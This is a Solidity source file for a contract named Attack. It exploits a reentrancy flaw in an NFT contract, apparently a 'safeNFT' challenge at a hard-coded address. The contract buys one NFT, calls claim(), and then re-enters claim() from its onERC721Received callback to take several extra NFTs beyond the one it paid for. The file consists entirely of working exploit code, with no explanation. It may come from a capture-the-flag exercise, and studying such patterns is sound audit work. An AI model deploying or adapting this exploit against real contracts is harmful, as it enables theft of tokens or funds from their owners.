// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./IsafeNFT.sol";
contract Attack is IERC721Receiver{
      address safenft = 0xf0337Cde99638F8087c670c80a57d470134C3AAE;
      uint256 public numNFTs = 0;
      uint price = 10000000000000000;
    constructor()  {
    }
    
    function attack() external payable {
        (bool sent, ) = 
        safenft.call{value: price}(abi.encodeWithSignature("buyNFT()"));
        require(sent, "Failed to send");
        IsafeNFT(safenft).claim();
         
    }


    function onERC721Received(address , address , uint256 , bytes calldata ) external override returns (bytes4) {
        numNFTs++;
        if(numNFTs <= 3){
          IsafeNFT(safenft).claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}